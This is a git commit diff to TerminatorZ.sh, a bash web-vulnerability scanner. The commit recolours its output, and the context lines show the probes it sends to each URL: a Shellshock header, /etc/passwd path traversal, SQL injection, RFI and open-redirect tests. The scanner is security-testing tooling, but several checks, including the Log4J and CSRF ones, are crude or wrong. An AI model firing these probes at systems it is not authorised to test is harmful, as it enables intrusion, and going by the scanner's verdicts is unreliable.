ff94f96c7ea53f43e30a7dcbf5457bc1f765bc6d
Black Hat Ethical Hacking <chris@blackhatethicalhacking.com>
2023-02-16 06:28:29 +0200

    Update TerminatorZ.sh

--- TerminatorZ.sh
+++ TerminatorZ.sh
@@ -38,17 +38,17 @@ do
   echo "Testing $url for RCE vulnerability..." | lolcat
 response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
 if [[ $response == *"vulnerable"* ]]; then
-  echo "$url is RCE vulnerable" >> "$domain/$domain.txt"
+  echo "$url is RCE \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
 else
-  echo "$url is not RCE vulnerable"
+  echo "$url is not RCE \033[32mVulnerable\033[0m"
 fi
  
 echo "Testing $url for CSRF vulnerability..." | lolcat
 response=$(curl -s -X POST -d 'token=test' "$url")
 if [[ $response == *"token=test"* ]]; then
-  echo "$url is CSRF vulnerable" >> "$domain/$domain.txt"
+  echo "$url is CSRF \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
 else
-  echo "$url is not CSRF vulnerable"
+  echo "$url is not CSRF \033[32mVulnerable\033[0m"
 fi
 
 
@@ -56,50 +56,50 @@ fi
 echo "Testing $url for LFI vulnerability..." | lolcat
 response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
 if [[ $response == *"root:"* ]]; then
-  echo "$url is LFI vulnerable" >> "$domain/$domain.txt"
+  echo "$url is LFI \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
 else
-  echo "$url is not LFI vulnerable"
+  echo "$url is not LFI \033[32mVulnerable\033[0m"
 fi
 
   echo "Testing $url for open redirect vulnerability..." | lolcat
   # Check for open redirect vulnerability
   response=$(curl -s -L "$url?redirect=http://google.com")
   if [[ $response == *"<title>Google</title>"* ]]; then
-    echo "$url is open redirect vulnerable" >> "$domain/$domain.txt"
+    echo "$url is open redirect \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
   else
-    echo "$url is not open redirect vulnerable"
+    echo "$url is not open redirect \033[32mVulnerable\033[0m"
   fi
   echo "Testing $url for Log4J vulnerability..." | lolcat
   # Check for Log4J vulnerability
   response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
   if [[ $response == *"log4j"* ]]; then
-    echo "$url is Log4J vulnerable" >> "$domain/$domain.txt"
+    echo "$url is Log4J \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
   else
-    echo "$url is not Log4J vulnerable"
+    echo "$url is not Log4J \033[32mVulnerable\033[0m"
   fi
   echo "Testing $url for RFI vulnerability..." | lolcat
   # Check for RFI vulnerability
   response=$(curl -s "$url?file=http://google.com")
   if [[ $response == *"<title>Google</title>"* ]]; then
-    echo "$url is RFI vulnerable" >> "$domain/$domain.txt"
+    echo "$url is RFI \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
   else
-    echo "$url is not RFI vulnerable"
+    echo "$url is not RFI \033[32mVulnerable\033[0m"
   fi
  # Check for directory traversal vulnerability
   echo "Testing $url for path/directory traversal vulnerability..." | lolcat
 response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
 if [[ $response == *"root:"* ]]; then
-  echo "$url is path traversal vulnerable" >> "$domain/$domain.txt"
+  echo "$url is path traversal \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
 else
-  echo "$url is not path traversal vulnerable"
+  echo "$url is not path traversal \033[32mVulnerable\033[0m"
 fi
 # Check for SQL injection vulnerability
 echo "Testing $url for SQL injection vulnerability..." | lolcat
 response=$(curl -s "$url/index.php?id=1'")
 if [[ $response == *"SQL syntax"* ]]; then
-  echo "$url is SQL injection vulnerable" >> "$domain/$domain.txt"
+  echo "$url is SQL injection \033[31mVulnerable\033[0m" >> "$domain/$domain.txt"
 else
-  echo "$url is not SQL injection vulnerable"
+  echo "$url is not SQL injection \033[32mVulnerable\033[0m"
 fi
 done < urls.txt
 mv urls.txt $domain
